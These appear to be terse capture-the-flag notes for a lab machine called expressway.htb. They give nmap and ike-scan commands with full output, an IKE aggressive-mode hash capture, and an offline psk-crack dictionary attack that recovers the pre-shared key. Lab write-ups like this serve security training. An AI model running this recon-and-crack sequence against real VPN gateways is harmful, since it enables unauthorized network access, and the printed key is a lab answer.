└─$ sudo nmap -v --top-ports 100 -T4 -Pn 10.129.178.196                                                                         
[sudo] password for user: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 22:39 CDT
Initiating Parallel DNS resolution of 1 host. at 22:39
Completed Parallel DNS resolution of 1 host. at 22:39, 0.01s elapsed
Initiating SYN Stealth Scan at 22:39
Scanning 10.129.178.196 [100 ports]
Discovered open port 22/tcp on 10.129.178.196
Completed SYN Stealth Scan at 22:39, 0.25s elapsed (100 total ports)
Nmap scan report for 10.129.178.196
Host is up (0.056s latency).
Not shown: 99 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
           Raw packets sent: 100 (4.400KB) | Rcvd: 100 (4.004KB)



---

ike-scan -M -A 10.129.173.201 

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.173.201  Aggressive Mode Handshake returned
        HDR=(CKY-R=c214a2b82da378e1)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.068 seconds (14.61 hosts/sec).  1 returned handshake; 0 returned notify

---

ike-scan -M -A expressway.htb -P

copy paste the hash to file "psk"

└─$ psk-crack -d /usr/share/wordlists/rockyou.txt psk

Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash dbf9368bf9295bcbf4dd8c5a3d9a19fd33ee9185
Ending psk-crack: 8045040 iterations in 5.419 seconds (1484579.18 iterations/sec)
                                                                                    
